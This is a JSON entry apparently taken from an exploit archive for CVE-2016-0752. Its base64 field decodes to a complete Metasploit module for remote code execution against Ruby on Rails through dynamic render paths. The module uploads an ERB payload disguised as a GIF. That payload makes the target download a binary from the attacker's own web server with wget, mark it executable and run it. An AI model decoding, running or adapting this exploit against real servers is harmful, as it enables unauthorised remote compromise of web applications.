{
    "source": "exploit-database", 
    "exploit": "cmVxdWlyZSAnbXNmL2NvcmUnDQoNCmNsYXNzIE1ldGFzcGxvaXRNb2R1bGUgPCBNc2Y6OkV4cGxvaXQ6OlJlbW90ZQ0KICBSYW5rID0gRXhjZWxsZW50UmFua2luZw0KDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpSZW1vdGU6Okh0dHBDbGllbnQNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6SHR0cFNlcnZlcg0KICBpbmNsdWRlIE1zZjo6RXhwbG9pdDo6RVhFDQogIGluY2x1ZGUgTXNmOjpFeHBsb2l0OjpGaWxlRHJvcHBlcg0KDQogIGRlZiBpbml0aWFsaXplKGluZm8gPSB7fSkNCiAgICBzdXBlcih1cGRhdGVfaW5mbyhpbmZvLA0KICAgICAgJ05hbWUnICAgICAgICAgICA9PiAnUnVieSBvbiBSYWlscyBEeW5hbWljIFJlbmRlciBGaWxlIFVwbG9hZCBSZW1vdGUgQ29kZSBFeGVjdXRpb24nLA0KICAgICAgJ0Rlc2NyaXB0aW9uJyAgICA9PiAlcXsNCiAgICAgICAgVGhpcyBtb2R1bGUgZXhwbG9pdHMgYSByZW1vdGUgY29kZSBleGVjdXRpb24gdnVsbmVyYWJpbGl0eSBpbiB0aGUgZXhwbGljaXQgcmVuZGVyDQogICAgICAgIG1ldGhvZCB3aGVuIGxldmVyYWdpbmcgdXNlciBwYXJhbWV0ZXJzLg0KICAgICAgICBUaGlzIG1vZHVsZSBoYXMgYmVlbiB0ZXN0ZWQgYWNyb3NzIG11bHRpcGxlIHZlcnNpb25zIG9mIFJ1Ynkgb24gUmFpbHMuDQogICAgICAgIFRoZSB0ZWNobmlxdWUgdXNlZCBieSB0aGlzIG1vZHVsZSByZXF1aXJlcyB0aGUgc3BlY2lmaWVkDQogICAgICAgIGVuZHBvaW50IHRvIGJlIHVzaW5nIGR5bmFtaWMgcmVuZGVyIHBhdGhzLCBzdWNoIGFzIHRoZSBmb2xsb3dpbmcgZXhhbXBsZToNCg0KICAgICAgICBkZWYgc2hvdw0KICAgICAgICAgIHJlbmRlciBwYXJhbXNbOmlkXQ0KICAgICAgICBlbmQNCg0KICAgICAgICBBbHNvLCB0aGUgdnVsbmVyYWJsZSB0YXJnZXQgd2lsbCBuZWVkIGEgUE9TVCBlbmRwb2ludCBmb3IgdGhlIFRlbXBGaWxlIHVwbG9hZCwgdGhpcw0KICAgICAgICBjYW4gbGl0ZXJhbGx5IGJlIGFueSBlbmRwb2ludC4gVGhpcyBtb2R1bGUgZG9lc250IHVzZSB0aGUgbG9nIGluY2x1c2lvbiBtZXRob2Qgb2YNCiAgICAgICAgZXhwbG9pdGF0aW9uIGR1ZSB0byBpdCBub3QgYmVpbmcgdW5pdmVyc2FsIGVub3VnaC4gSW5zdGVhZCwgYSBuZXcgY29kZSBpbmplY3Rpb24NCiAgICAgICAgdGVjaG5pcXVlIHdhcyBmb3VuZCBhbmQgdXNlZCB3aGVyZWJ5IGFuIGF0dGFja2VyIGNhbiB1cGxvYWQgdGVtcG9yYXJ5IGltYWdlIGZpbGVzDQogICAgICAgIGFnYWluc3QgYW55IFBPU1QgZW5kcG9pbnQgYW5kIHVzZSB0aGVtIGZvciB0aGUgaW5jbHVzaW9uIGF0dGFjay4gRmluYWxseSwgeW91IG9ubHkNCiAgICAgICAgZ2V0IG9uZSBzaG90IGF0IHRoaXMgaWYgeW91IGFyZSB0ZXN0aW5nIHdpdGggdGhlIGJ1aWx0aW4gcmFpbHMgc2VydmVyLCB1c2UgY2F1dGlvbi4NCiAgICAgIH0sDQogICAgICAnQXV0aG9yJyAgICAgICAgID0+DQogICAgICAgIFsNCiAgICAgICAgICAnbXJfbWUgPG1yX21lQG9mZmVuc2l2ZS1zZWN1cml0eS5jb20+JywgICAgICAjIG5lY3JvbWFuY2VkIG9sZCBidWcgJiBkaXNjb3ZlcmVkIG5ldyB2ZWN0b3IgcmNlIHZlY3Rvcg0KICAgICAgICAgICdKb2huIFBvdWxpbiAoZm9yY2VkLXJlcXVlc3QpJyAgICAgICAgICAgICAgICMgb3JpZ2luYWwgcmVuZGVyIGJ1ZyBmaW5kZXINCiAgICAgICAgXSwNCiAgICAgICdSZWZlcmVuY2VzJyAgPT4NCiAgICAgICAgWw0KICAgICAgICAgIFsgJ0NWRScsICcyMDE2LTA3NTInXSwNCiAgICAgICAgICBbICdVUkwnLCAnaHR0cHM6Ly9ncm91cHMuZ29vZ2xlLmNvbS9mb3J1bS8jIXRvcGljL3J1YnlvbnJhaWxzLXNlY3VyaXR5LzMzNVAxRGNMRzAwJ10sICAgICAgICAjIHJhaWxzIHBhdGNoDQogICAgICAgICAgWyAnVVJMJywgJ2h0dHBzOi8vbnZpc2l1bS5jb20vYmxvZy8yMDE2LzAxLzI2L3JhaWxzLWR5bmFtaWMtcmVuZGVyLXRvLXJjZS1jdmUtMjAxNi0wNzUyLyddLCAgIyBKb2huIFBvdWxpbiBDVkUtMjAxNi0wNzUyIHBhdGNoZWQgaW4gNS4wLjAuYmV0YTEuMSAtIEphbnVhcnkgMjUsIDIwMTYNCiAgICAgICAgICBbICdVUkwnLCAnaHR0cHM6Ly9naXN0LmdpdGh1Yi5jb20vZm9yY2VkLXJlcXVlc3QvNTE1ODc1OWE2NDE4ZTYzNzZhZmInXSwgICAgICAgICAgICAgICAgICAgICAjIEpvaG4ncyBvcmlnaW5hbCBleHBsb2l0DQogICAgICAgIF0sDQogICAgICAnTGljZW5zZScgICAgICAgID0+IE1TRl9MSUNFTlNFLA0KICAgICAgJ1BsYXRmb3JtJyAgICA9PiBbJ2xpbnV4JywgJ2JzZCddLA0KICAgICAgJ0FyY2gnICAgICAgICA9PiBBUkNIX1g4NiwNCiAgICAgICdQYXlsb2FkJyAgICAgICAgPT4NCiAgICAgICAgew0KICAgICAgICAgICdEaXNhYmxlTm9wcycgPT4gdHJ1ZSwNCiAgICAgICAgfSwNCiAgICAgICdQcml2aWxlZ2VkJyAgICAgPT4gZmFsc2UsDQogICAgICAnVGFyZ2V0cycgICAgID0+DQogICAgICAgIFsNCiAgICAgICAgICBbICdSdWJ5IG9uIFJhaWxzIDQuMC44IEp1bHkgMiwgMjAxNCcsIHt9IF0gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAjIE90aGVyIHZlcnNpb25zIGFyZSBhbHNvIGFmZmVjdGVkDQogICAgICAgIF0sDQogICAgICAnRGVmYXVsdFRhcmdldCcgPT4gMCwNCiAgICAgICdEaXNjbG9zdXJlRGF0ZScgPT4gJ09jdCAxNiAyMDE2JykpDQogICAgcmVnaXN0ZXJfb3B0aW9ucygNCiAgICAgIFsNCiAgICAgICAgT3B0OjpSUE9SVCgzMDAwKSwNCiAgICAgICAgT3B0U3RyaW5nLm5ldygnVVJJUEFUSCcsIFsgdHJ1ZSwgJ1RoZSBwYXRoIHRvIHRoZSB2dWxuZXJhYmxlIHJvdXRlJywgIi91c2VycyJdKSwNCiAgICAgICAgT3B0UG9ydC5uZXcoJ1NSVlBPUlQnLCBbIHRydWUsICdUaGUgZGFlbW9uIHBvcnQgdG8gbGlzdGVuIG9uJywgMTMzNyBdKSwNCiAgICAgIF0sIHNlbGYuY2xhc3MpDQogIGVuZA0KDQogIGRlZiBjaGVjaw0KDQogICAgIyB0aGlzIGlzIHRoZSBjaGVjayBmb3IgdGhlIGRldiBlbnZpcm9ubWVudA0KICAgIHJlcyA9IHNlbmRfcmVxdWVzdF9jZ2koew0KICAgICAgJ3VyaScgICAgICAgPT4gIG5vcm1hbGl6ZV91cmkoZGF0YXN0b3JlWydVUklQQVRIJ10sICIlMmYiKSwNCiAgICAgICdtZXRob2QnICAgID0+ICAnR0VUJywNCiAgICB9LCA2MCkNCg0KICAgICMgaWYgdGhlIHBhZ2UgY29udHJvbGxlciBpcyBkeW5hbWljYWxseSByZW5kZXJpbmcsIGl0cyBmb3Igc3VyZSB2dWxuDQogICAgaWYgcmVzIGFuZCByZXMuYm9keSA9fiAvcmVuZGVyIHBhcmFtcy8NCiAgICAgIHJldHVybiBDaGVja0NvZGU6OlZ1bG5lcmFibGUNCiAgICBlbmQNCg0KICAgICMgdGhpcyBpcyB0aGUgY2hlY2sgZm9yIHRoZSBwcm9kIGVudmlyb25tZW50DQogICAgcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSh7DQogICAgICAndXJpJyAgICAgICA9PiAgbm9ybWFsaXplX3VyaShkYXRhc3RvcmVbJ1VSSVBBVEgnXSwgIiUyZnByb2MlMmZzZWxmJTJmY29tbSIpLA0KICAgICAgJ21ldGhvZCcgICAgPT4gICdHRVQnLA0KICAgIH0sIDYwKQ0KDQogICAgIyBpZiB3ZSBjYW4gcmVhZCBmaWxlcywgaXRzIGxpa2xleSB3ZSBjYW4gZXhlY3V0ZSBjb2RlDQogICAgaWYgcmVzIGFuZCByZXMuYm9keSA9fiAvcnVieS8NCiAgICAgIHJldHVybiBDaGVja0NvZGU6OkFwcGVhcnMNCiAgICBlbmQNCiAgICByZXR1cm4gQ2hlY2tDb2RlOjpTYWZlDQogIGVuZA0KDQogIGRlZiBvbl9yZXF1ZXN0X3VyaShjbGksIHJlcXVlc3QpDQogICAgaWYgKG5vdCBAcGwpDQogICAgICBwcmludF9lcnJvcigiI3tyaG9zdH06I3tycG9ydH0gLSBBIHJlcXVlc3QgY2FtZSBpbiwgYnV0IHRoZSBwYXlsb2FkIHdhc24ndCByZWFkeSB5ZXQhIikNCiAgICAgIHJldHVybg0KICAgIGVuZA0KICAgIHByaW50X3N0YXR1cygiI3tyaG9zdH06I3tycG9ydH0gLSBTZW5kaW5nIHRoZSBwYXlsb2FkIHRvIHRoZSBzZXJ2ZXIuLi4iKQ0KICAgIEBlbGZfc2VudCA9IHRydWUNCiAgICBzZW5kX3Jlc3BvbnNlKGNsaSwgQHBsKQ0KICBlbmQNCg0KICBkZWYgc2VuZF9wYXlsb2FkDQogICAgQGJkID0gcmFuZF90ZXh0X2FscGhhKDgrcmFuZCg4KSkNCiAgICBmbiAgPSByYW5kX3RleHRfYWxwaGEoOCtyYW5kKDgpKQ0KICAgIHVuICA9IHJhbmRfdGV4dF9hbHBoYSg4K3JhbmQoOCkpDQogICAgcG4gID0gcmFuZF90ZXh0X2FscGhhKDgrcmFuZCg4KSkNCiAgICByZWdpc3Rlcl9maWxlX2Zvcl9jbGVhbnVwKCIvdG1wLyN7QGJkfSIpDQogICAgY21kICA9ICJ3Z2V0ICN7QHNlcnZpY2VfdXJsfSAtTyAvdG1wLyN7QGJkfTsiDQogICAgY21kIDw8ICJjaG1vZCA3NTUgL3RtcC8je0BiZH07Ig0KICAgIGNtZCA8PCAiL3RtcC8je0BiZH0iDQogICAgcGF5ID0gIjwlPWAje2NtZH1gJT4iDQogICAgcHJpbnRfc3RhdHVzKCJ1cGxvYWRpbmcgaW1hZ2UuLi4iKQ0KICAgIGRhdGEgPSBSZXg6Ok1JTUU6Ok1lc3NhZ2UubmV3DQogICAgZGF0YS5hZGRfcGFydChwYXksIG5pbCwgbmlsLCAnZm9ybS1kYXRhOyBuYW1lPSIje3VufSI7IGZpbGVuYW1lPSIje2ZufS5naWYiJykNCiAgICByZXMgPSBzZW5kX3JlcXVlc3RfY2dpKHsNCiAgICAgICdtZXRob2QnID0+ICdQT1NUJywNCiAgICAgICdjb29raWUnID0+IEBjb29raWUsDQogICAgICAndXJpJyAgICA9PiBub3JtYWxpemVfdXJpKGRhdGFzdG9yZVsnVVJJUEFUSCddLCBwbiksDQogICAgICAnY3R5cGUnICA9PiAibXVsdGlwYXJ0L2Zvcm0tZGF0YTsgYm91bmRhcnk9I3tkYXRhLmJvdW5kfSIsDQogICAgICAnZGF0YScgICA9PiBkYXRhLnRvX3MNCiAgICB9KQ0KICAgIGlmIHJlcyBhbmQgcmVzLmNvZGUgPT0gNDIyIGFuZCByZXMuYm9keSA9fiAvVGVtcGZpbGU6XC8oLiopPi8NCiAgICAgIEBwYXRoID0gIiN7JDF9IiBpZiByZXMuYm9keSA9fiAvVGVtcGZpbGU6XC8oLiopPi8NCiAgICAgIHJldHVybiB0cnVlDQogICAgZWxzZQ0KDQogICAgICAjIHRoaXMgaXMgd2hlcmUgd2UgcHVsbCB0aGUgbG9nIGZpbGUNCiAgICAgIGlmIGxlYWtfbG9nDQogICAgICAgIHJldHVybiB0cnVlDQogICAgICBlbmQNCiAgICBlbmQNCiAgICByZXR1cm4gZmFsc2UNCiAgZW5kDQoNCiAgZGVmIGxlYWtfbG9nDQoNCiAgICAjIHBhdGggdG8gdGhlIGxvZyAvcHJvYy9zZWxmL2ZkLzcNCiAgICAjIHRoaXMgYnlwYXNzZXMgdGhlIGV4dGVuc2lvbiBjaGVjaw0KICAgIHJlcyA9IHNlbmRfcmVxdWVzdF9jZ2koew0KICAgICAgJ3VyaScgICAgICAgPT4gIG5vcm1hbGl6ZV91cmkoZGF0YXN0b3JlWydVUklQQVRIJ10sICJwcm9jJTJmc2VsZiUyZmZkJTJmNyIpLA0KICAgICAgJ21ldGhvZCcgICAgPT4gICdHRVQnLA0KICAgIH0sIDYwKQ0KDQogICAgaWYgcmVzIGFuZCByZXMuY29kZSA9PSAyMDAgYW5kIHJlcy5ib2R5ID1+IC9UZW1wZmlsZTpcLyguKik+LCBAb3JpZ2luYWxfZmlsZW5hbWU9Lw0KICAgICAgQHBhdGggPSAiI3skMX0iIGlmIHJlcy5ib2R5ID1+IC9UZW1wZmlsZTpcLyguKik+LCBAb3JpZ2luYWxfZmlsZW5hbWU9Lw0KICAgICAgcmV0dXJuIHRydWUNCiAgICBlbmQNCiAgICByZXR1cm4gZmFsc2UNCiAgZW5kDQoNCiAgZGVmIHN0YXJ0X2h0dHBfc2VydmVyDQogICAgQHBsID0gZ2VuZXJhdGVfcGF5bG9hZF9leGUNCiAgICBAZWxmX3NlbnQgPSBmYWxzZQ0KICAgIGRvd25maWxlID0gcmFuZF90ZXh0X2FscGhhKDgrcmFuZCg4KSkNCiAgICByZXNvdXJjZV91cmkgPSAnLycgKyBkb3duZmlsZQ0KICAgIGlmIChkYXRhc3RvcmVbJ1NSVkhPU1QnXSA9PSAiMC4wLjAuMCIgb3IgZGF0YXN0b3JlWydTUlZIT1NUJ10gPT0gIjo6IikNCiAgICAgIHNydl9ob3N0ID0gZGF0YXN0b3JlWydVUklIT1NUJ10gfHwgUmV4OjpTb2NrZXQuc291cmNlX2FkZHJlc3Mocmhvc3QpDQogICAgZWxzZQ0KICAgICAgc3J2X2hvc3QgPSBkYXRhc3RvcmVbJ1NSVkhPU1QnXQ0KICAgIGVuZA0KDQogICAgIyBkbyBub3QgdXNlIFNTTCBmb3IgdGhlIGF0dGFja2luZyB3ZWIgc2VydmVyDQogICAgaWYgZGF0YXN0b3JlWydTU0wnXQ0KICAgICAgc3NsX3Jlc3RvcmUgPSB0cnVlDQogICAgICBkYXRhc3RvcmVbJ1NTTCddID0gZmFsc2UNCiAgICBlbmQNCg0KICAgIEBzZXJ2aWNlX3VybCA9ICJodHRwOi8vI3tzcnZfaG9zdH06I3tkYXRhc3RvcmVbJ1NSVlBPUlQnXX0je3Jlc291cmNlX3VyaX0iDQogICAgc2VydmljZV91cmxfcGF5bG9hZCA9IHNydl9ob3N0ICsgcmVzb3VyY2VfdXJpDQogICAgcHJpbnRfc3RhdHVzKCIje3Job3N0fToje3Jwb3J0fSAtIFN0YXJ0aW5nIHVwIG91ciB3ZWIgc2VydmljZSBvbiAje0BzZXJ2aWNlX3VybH0gLi4uIikNCiAgICBzdGFydF9zZXJ2aWNlKHsnVXJpJyA9PiB7DQogICAgICAnUHJvYycgPT4gUHJvYy5uZXcgeyB8Y2xpLCByZXF8DQogICAgICAgIG9uX3JlcXVlc3RfdXJpKGNsaSwgcmVxKQ0KICAgICAgfSwNCiAgICAgICdQYXRoJyA9PiByZXNvdXJjZV91cmkNCiAgICB9fSkNCiAgICBkYXRhc3RvcmVbJ1NTTCddID0gdHJ1ZSBpZiBzc2xfcmVzdG9yZQ0KICAgIGNvbm5lY3QNCiAgZW5kDQoNCiAgZGVmIHJlbmRlcl90bXBmaWxlDQogICAgQHBhdGguZ3N1YiEoL1wvLywgJyUyZicpDQogICAgcmVzID0gc2VuZF9yZXF1ZXN0X2NnaSh7DQogICAgICAndXJpJyAgICAgICA9PiAgbm9ybWFsaXplX3VyaShkYXRhc3RvcmVbJ1VSSVBBVEgnXSwgQHBhdGgpLA0KICAgICAgJ21ldGhvZCcgICAgPT4gICdHRVQnLA0KICAgIH0sIDEpDQogIGVuZA0KDQogIGRlZiBleHBsb2l0DQogICAgICBwcmludF9zdGF0dXMoIlNlbmRpbmcgaW5pdGlhbCByZXF1ZXN0IHRvIGRldGVjdCBleHBsb2l0YWJpbGl0eSIpDQogICAgICBzdGFydF9odHRwX3NlcnZlcg0KICAgICAgaWYgc2VuZF9wYXlsb2FkDQogICAgICAgIHByaW50X2dvb2QoImluamVjdGVkIHBheWxvYWQiKQ0KICAgICAgICByZW5kZXJfdG1wZmlsZQ0KDQogICAgICAgICMgd2UgbmVlZCB0byBkZWxheSwgZm9yIHRoZSBzdGFnZXINCiAgICAgICAgc2VsZWN0KG5pbCwgbmlsLCBuaWwsIDUpDQogICAgICBlbmQNCiAgZW5kDQplbmQ=", 
    "filename": "platforms/multiple/remote/40561.rb", 
    "id": "40561", 
    "cves": [
        "CVE-2016-0752"
    ]
}